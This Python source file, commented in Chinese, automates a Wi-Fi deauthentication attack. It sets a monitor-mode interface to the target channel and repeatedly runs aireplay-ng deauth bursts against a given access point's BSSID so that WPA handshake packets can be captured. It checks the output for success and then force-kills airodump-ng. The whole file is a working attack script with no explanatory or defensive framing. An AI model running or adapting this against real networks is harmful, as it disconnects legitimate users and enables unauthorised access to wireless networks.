# coding:utf-8
import os
import subprocess
import re
import time
"""
不断执行route攻击，搜集握手包
"""
filedir = os.path.dirname(os.path.realpath(__file__))


class ROUTE:

    def __init__(self, mac, wlanname, ch):
        # self.routeattack = os.path.join(filedir, 'routrattack', 'routeattack.log')
        self.logpath = "/home/execute.log"
        self.mac = mac
        self.limit = 5
        self.wlanname = wlanname
        self.ch = ch

    # 保存shell的所有输出
    def writeinfotolog(self):
        # 改变网卡的信道，使网卡适应目标wifi的信道
        iwcmd = 'iwconfig {}mon channel {}'.format(self.wlanname, self.ch)
        subprocess.call(iwcmd, shell=True)
        cmd = 'aireplay-ng -0 10 -a {} {}mon'.format(self.mac, self.wlanname)
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        output, err = p.communicate()
        return output

    def killairodump(self):
        subprocess.call("ps -ef|grep airodump-ng|grep -v grep|cut -c 9-15|xargs kill -s 9", shell=True)
        return

    def start(self):
        count = 0
        re_route = re.compile(r'Sending DeAuth to broadcast \-\- BSSID\: \[{}\]'.format(self.mac))
        while True:
            # 防止主程序结束后还在自己运行
            if count > self.limit:
                break
            count += 1
            strtext = self.writeinfotolog()
            router = re_route.findall(strtext)
            # 泛洪攻击没有成功则停0.5s继续
            if len(router) == 0:
                time.sleep(0.2)
            else:
                # 泛洪攻击成功后停止程序
                time.sleep(2)
                break
        self.killairodump()
        return